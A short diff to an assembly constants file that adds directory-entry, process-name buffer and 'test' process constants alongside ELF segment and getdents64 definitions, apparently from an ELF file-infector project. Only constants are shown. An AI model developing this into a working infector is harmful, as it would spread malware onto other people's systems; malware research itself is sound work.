@@ -13,6 +13,7 @@
 %define O_RDONLY	0
 %define O_RDWR		2
 %define SEEK_END	2
+%define DT_DIR		4
 %define DT_REG		8
 %define PT_LOAD		1
 %define PT_NOTE		4
@@ -35,6 +36,11 @@
 %define SYS_GETDENTS64	217
 
 ; Stack buffer offsets
+%define COMM_FD 0
+%define COMM 8
+
+%define TEST_PROC 0x74736574
+
 %define STAT 0
 %define ST_SIZE 48
 %define EHDR 144
